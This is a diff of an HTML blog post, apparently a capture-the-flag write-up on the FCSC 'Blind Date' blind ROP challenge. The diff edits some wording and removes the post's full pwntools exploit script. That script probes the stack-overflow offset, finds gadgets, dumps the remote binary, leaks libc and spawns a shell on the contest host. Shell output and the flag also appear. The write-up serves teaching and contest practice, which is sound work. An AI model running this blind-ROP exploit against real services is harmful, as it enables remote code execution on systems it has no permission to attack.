@@ -81,7 +81,7 @@ if (!doNotTrack) {
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          17 min read
+          14 min read
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
@@ -108,7 +108,7 @@ if (!doNotTrack) {
 </blockquote>
 <p>Blind Date is a blind rop challenge I did during the <a href="https://www.france-cybersecurity-challenge.fr">FCSC event</a>.
 So, no source code is provided, we juste have a netcat to which we can interact.</p>
-<p>To solve this challenge I juste read carefully <a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">this paper</a> and applied one per one the techniques described.</p>
+<p>To solve this challenge I just carefully took a look at <a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">this paper</a> and applied one per one the techniques described.</p>
 <h3 id="find-the-right-offset">Find the right offset</h3>
 <p>The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/python3</span>
@@ -132,7 +132,7 @@ So, no source code is provided, we juste have a netcat to which we can interact.
     <span style="color:#ff79c6">return</span> padding[:<span style="color:#8be9fd;font-style:italic">len</span>(padding)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#6272a4"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span>
 
 <span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">len</span>(find_padding()))
-</code></pre></div><p>It&rsquo;s basically sending checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
+</code></pre></div><p>It&rsquo;s basically just checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and returns the corresponding offset. We do not check if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
 <pre><code>$ ./solve.py
 [*] sending: b'\x90'
 [*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n'
@@ -389,7 +389,7 @@ leak2(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34
 [0x400743] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@'
 [0x400758] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@'
 </code></pre><p>If we read carefully, we can notice the <code>[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '</code> gadget.
-It&rsquo;s a very good stop gadget because it&rsquo;s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.
+It&rsquo;s a very good one because it&rsquo;s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.
 And so for our attack we will use it.</p>
 <h3 id="brop-gadget">Brop gadget</h3>
 <p>Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It&rsquo;s easy to find because it&rsquo;s a pop of six qword like that:</p>
@@ -440,54 +440,7 @@ And so here is the script:</p>
 find_brop(<span style="color:#f1fa8c">&#34;a&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">40</span>)
 </code></pre></div><p>Which returns:</p>
 <pre><code>$ ./solve.py
-_ - 0x0
-_ - 0x23
-_ - 0x46
-_ - 0x69
-_ - 0x8c
-_ - 0xaf
-_ - 0xd2
-_ - 0xf5
-_ - 0x118
-_ - 0x13b
-_ - 0x15e
-_ - 0x181
-_ - 0x1a4
-_ - 0x1c7
-_ - 0x1ea
-_ - 0x20d
-_ - 0x230
-_ - 0x253
-_ - 0x276
-_ - 0x299
-_ - 0x2bc
-_ - 0x2df
-_ - 0x302
-_ - 0x325
-_ - 0x348
-_ - 0x36b
-_ - 0x38e
-_ - 0x3b1
-_ - 0x3d4
-_ - 0x3f7
-_ - 0x41a
-_ - 0x43d
-_ - 0x460
-_ - 0x483
-_ - 0x4a6
-_ - 0x4c9
-_ - 0x4ec
-_ - 0x50f
-_ - 0x532
-_ - 0x555
-_ - 0x578
-_ - 0x59b
-_ - 0x5be
-_ - 0x5e1
-_ - 0x604
-_ - 0x627
-_ - 0x64a
-_ - 0x66d
+[SKIP]
 _ - 0x690
 _ - 0x6b3
 _ - 0x6d6
@@ -685,206 +638,7 @@ $ id
 uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
 $ cat flag
 FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
-</code></pre><p>Here is the final script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/python3</span>
-<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
-
-STOP_GADGETS <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">0x400668</span>]
-
-CSU_POP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40073a</span>
-POP_RDI <span style="color:#ff79c6">=</span> CSU_POP<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x9</span>
-POP_RSI_R15 <span style="color:#ff79c6">=</span> CSU_POP<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x7</span>
-
-GADGET_LEAK <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400510</span>
-FFLUSH_GOT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400000</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x200FF0</span>
-FFLUSH_OFFSET <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x069ab0</span>
-OFFT_BINSH <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1633e8</span>
-
-SYSTEM <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x041490</span> 
-
-<span style="color:#f1fa8c">&#34;&#34;&#34;
-</span><span style="color:#f1fa8c">__libc_start_main 	0x021a50 	0x0
-</span><span style="color:#f1fa8c">system 	0x041490 	0x1fa40
-</span><span style="color:#f1fa8c">fflush 	0x069ab0 	0x48060
-</span><span style="color:#f1fa8c">open 	0x0db950 	0xb9f00
-</span><span style="color:#f1fa8c">read 	0x0dbb90 	0xba140
-</span><span style="color:#f1fa8c">write 	0x0dbbf0 	0xba1a0
-</span><span style="color:#f1fa8c">str_bin_sh 	0x1633e8 	0x141998
-</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
-
-context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;error&#39;</span>
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>():
-    <span style="color:#ff79c6">return</span> remote(<span style="color:#f1fa8c">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#bd93f9">4008</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">padd</span>(s):
-    <span style="color:#ff79c6">return</span> s <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">-</span>(<span style="color:#8be9fd;font-style:italic">len</span>(s) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span>))
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpadd</span>(s):
-    <span style="color:#ff79c6">return</span> s<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#bd93f9">0</span>]
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">is_crash</span>(s):
-    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">not</span> (<span style="color:#8be9fd;font-style:italic">len</span>(s) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">is_stop</span>(s, ip, padding):
-    <span style="color:#ff79c6">return</span> (ip <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> STOP_GADGETS) <span style="color:#ff79c6">and</span> (s <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Thanks &#34;</span> <span style="color:#ff79c6">+</span> padding <span style="color:#ff79c6">+</span> unpadd(p64(ip)) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt; &#34;</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">jmp</span>(av):
-    io <span style="color:#ff79c6">=</span> start()
-    io<span style="color:#ff79c6">.</span>write(av)
-    <span style="color:#ff79c6">return</span> io<span style="color:#ff79c6">.</span>recvall(timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5.0</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_padding</span>(p<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>):
-    padding <span style="color:#ff79c6">=</span> p <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span>
-    <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[*] sending: {padding}&#34;</span>)
-    resp <span style="color:#ff79c6">=</span> jmp(padding)
-    <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[*] recv: {resp}&#34;</span>)
-    <span style="color:#ff79c6">while</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Hello you.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">What is your name ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt;&gt; Thanks &#34;</span> <span style="color:#ff79c6">+</span> padding <span style="color:#ff79c6">in</span> resp:
-        <span style="color:#ff79c6">return</span> find_padding(p<span style="color:#ff79c6">=</span>padding)
-    <span style="color:#ff79c6">return</span> padding[:<span style="color:#8be9fd;font-style:italic">len</span>(padding)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#6272a4"># minus one char because we do not want that padding overwrite the return address</span>
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak2</span>(padding: <span style="color:#8be9fd;font-style:italic">str</span>, leak1<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>):
-    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">256</span>):
-        buf <span style="color:#ff79c6">=</span> padding <span style="color:#ff79c6">+</span> leak1 <span style="color:#ff79c6">+</span> p8(i)
-        resp <span style="color:#ff79c6">=</span> try_jmp(buf)
-        <span style="color:#6272a4"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
-        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(resp):
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[{hex(int.from_bytes(padd(leak1+p8(i)), &#39;little&#39;))}] Output: {resp}&#34;</span>)
-            <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(leak1) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">8</span>:
-                leak2(padding, leak1<span style="color:#ff79c6">=</span>leak1<span style="color:#ff79c6">+</span>p8(i))
-            <span style="color:#ff79c6">else</span>:
-                <span style="color:#ff79c6">return</span> leak1
-
-    <span style="color:#ff79c6">return</span> leak1
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak2_opti</span>(padding: <span style="color:#8be9fd;font-style:italic">str</span>):
-    base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400000</span>
-
-    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0x2000</span>):
-        buf <span style="color:#ff79c6">=</span> padding <span style="color:#ff79c6">+</span> p64(base<span style="color:#ff79c6">+</span>i)
-        resp <span style="color:#ff79c6">=</span> try_jmp(buf)
-        <span style="color:#6272a4"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
-        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(resp):
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[{hex(base+i)}] Output: {resp}&#34;</span>)
-            <span style="color:#ff79c6">continue</span>
-
-    <span style="color:#ff79c6">return</span> leak1
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_brop</span>(padding):
-    base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400000</span>
-
-    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x2000</span>):
-        buf <span style="color:#ff79c6">=</span> padding <span style="color:#ff79c6">+</span> p64(base <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">6</span> <span style="color:#ff79c6">+</span> p64(STOP_GADGETS[<span style="color:#bd93f9">0</span>])
-        resp <span style="color:#ff79c6">=</span> try_jmp(buf)
-        <span style="color:#ff79c6">if</span> is_stop(resp, base<span style="color:#ff79c6">+</span>i, padding):
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span>)
-            <span style="color:#ff79c6">break</span>
-
-        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">35</span>:
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;_ - {hex(i)}&#34;</span>)
-
-    <span style="color:#ff79c6">return</span> base <span style="color:#ff79c6">+</span> i
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dump_binary</span>(padding, base):
-    gadget_leak <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400510</span>
-    i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> 
-    buf <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
-
-    pattern <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Thanks &#34;</span> <span style="color:#ff79c6">+</span> padding <span style="color:#ff79c6">+</span> unpadd(p64(POP_RDI))
-
-    f <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;leet_dump.bin&#34;</span>, <span style="color:#f1fa8c">&#34;ab&#34;</span>)
-
-    <span style="color:#ff79c6">while</span> base<span style="color:#ff79c6">+</span>i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x400fff</span>:
-        resp1 <span style="color:#ff79c6">=</span> try_jmp(padding <span style="color:#ff79c6">+</span> p64(POP_RDI) <span style="color:#ff79c6">+</span> p64(base<span style="color:#ff79c6">+</span>i) <span style="color:#ff79c6">+</span> p64(POP_RSI_R15) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> p64(gadget_leak) <span style="color:#ff79c6">+</span> p64(STOP_GADGETS[<span style="color:#bd93f9">0</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>))
-
-        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> <span style="color:#8be9fd;font-style:italic">len</span>(resp1):
-            <span style="color:#ff79c6">continue</span>
-
-        leak <span style="color:#ff79c6">=</span> resp1[<span style="color:#8be9fd;font-style:italic">len</span>(pattern):resp1<span style="color:#ff79c6">.</span>index(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&gt;&gt;&gt; &#39;</span>)]
-        
-        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> <span style="color:#8be9fd;font-style:italic">len</span>(leak):
-            buf <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[*] recv @ {hex(base+i)}: 0x00&#34;</span>)
-            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
-        <span style="color:#ff79c6">else</span>:
-            buf <span style="color:#ff79c6">+=</span> leak
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[*] recv @ {hex(base+i)}: {leak.hex()}&#34;</span>)
-
-            i <span style="color:#ff79c6">=</span> i <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">len</span>(leak)
-        
-        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(buf) <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x100</span>:
-            f<span style="color:#ff79c6">.</span>write(buf)
-            buf <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
-            <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;Buffering ..&#34;</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_plt</span>(padding):
-    base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400000</span> 
-    s <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> 
-
-    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0x0</span>, <span style="color:#bd93f9">0x3000</span>, <span style="color:#bd93f9">0x10</span>):
-        resp1 <span style="color:#ff79c6">=</span> try_jmp(padding <span style="color:#ff79c6">+</span> p64(POP_RDI) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x400000</span>) <span style="color:#ff79c6">+</span> p64(POP_RSI_R15) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x400000</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> p64(base<span style="color:#ff79c6">+</span>i) <span style="color:#ff79c6">+</span> p64(STOP_GADGETS[<span style="color:#bd93f9">0</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>)) 
-
-        <span style="color:#ff79c6">if</span> is_stop(resp1, base<span style="color:#ff79c6">+</span>i, padding):
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span>)
-
-        <span style="color:#ff79c6">elif</span> <span style="color:#8be9fd;font-style:italic">len</span>(resp1):
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;[{hex(base+i)}] Out: {resp1.hex()}&#34;</span>)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">try_jmp</span>(s):
-    <span style="color:#ff79c6">while</span> True:
-        <span style="color:#ff79c6">try</span>:
-            io <span style="color:#ff79c6">=</span> start()
-            io<span style="color:#ff79c6">.</span>write(s)
-            resp <span style="color:#ff79c6">=</span> io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">500</span>, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">30.0</span>)[<span style="color:#bd93f9">35</span>:]
-            <span style="color:#ff79c6">break</span>
-        <span style="color:#ff79c6">except</span>:
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;STOP: {sys.exc_info()[0]}&#34;</span>)
-            resp <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> 
-            <span style="color:#ff79c6">break</span>
-
-    <span style="color:#ff79c6">return</span> resp
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">try_jmp_flow</span>(s):
-    <span style="color:#ff79c6">while</span> True:
-        <span style="color:#ff79c6">try</span>:
-            io <span style="color:#ff79c6">=</span> start()
-            io<span style="color:#ff79c6">.</span>write(s)
-            resp <span style="color:#ff79c6">=</span> io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">500</span>, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">30.0</span>)[<span style="color:#bd93f9">35</span>:]
-            <span style="color:#ff79c6">break</span>
-        <span style="color:#ff79c6">except</span>:
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;STOP: {sys.exc_info()[0]}&#34;</span>)
-            resp <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> 
-            <span style="color:#ff79c6">break</span>
-
-    <span style="color:#ff79c6">return</span> resp, io
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">flow</span>(padding):
-    payload <span style="color:#ff79c6">=</span> av
-    payload <span style="color:#ff79c6">+=</span> p64(POP_RDI)
-    payload <span style="color:#ff79c6">+=</span> p64(FFLUSH_GOT)
-    payload <span style="color:#ff79c6">+=</span> p64(POP_RSI_R15) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xffffffffffffffff</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span>
-    payload <span style="color:#ff79c6">+=</span> p64(GADGET_LEAK)
-    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0x400000</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x656</span>) <span style="color:#6272a4"># ret2main</span>
-
-    pattern <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Thanks &#34;</span> <span style="color:#ff79c6">+</span> padding <span style="color:#ff79c6">+</span> unpadd(p64(POP_RDI))
-    resp_tmp, io <span style="color:#ff79c6">=</span> try_jmp_flow(payload)
-    <span style="color:#ff79c6">print</span>(resp_tmp)
-    leak_fflush <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span><span style="color:#ff79c6">.</span>from_bytes(resp_tmp[<span style="color:#8be9fd;font-style:italic">len</span>(pattern):resp_tmp<span style="color:#ff79c6">.</span>index(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;What is&#39;</span>)], <span style="color:#f1fa8c">&#39;little&#39;</span>)
-
-    libc <span style="color:#ff79c6">=</span> leak_fflush <span style="color:#ff79c6">-</span> FFLUSH_OFFSET 
-    <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;libc @ {hex(libc)}&#34;</span>)
-
-    payload <span style="color:#ff79c6">=</span> av
-    payload <span style="color:#ff79c6">+=</span> p64(POP_RDI)
-    payload <span style="color:#ff79c6">+=</span> p64(libc <span style="color:#ff79c6">+</span> OFFT_BINSH)
-    payload <span style="color:#ff79c6">+=</span> p64(libc <span style="color:#ff79c6">+</span> SYSTEM)
-
-    io<span style="color:#ff79c6">.</span>send(payload)
-    io<span style="color:#ff79c6">.</span>interactive()
-
-flow(<span style="color:#f1fa8c">&#34;a&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">40</span>)
-<span style="color:#6272a4"># FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</span>
-</code></pre></div><p>Thanks to the creator of this very interesting challenge !</p>
+</code></pre><p>Thanks to the creator of this very interesting challenge !</p>
 
     </div>
     <div class="post-footer">
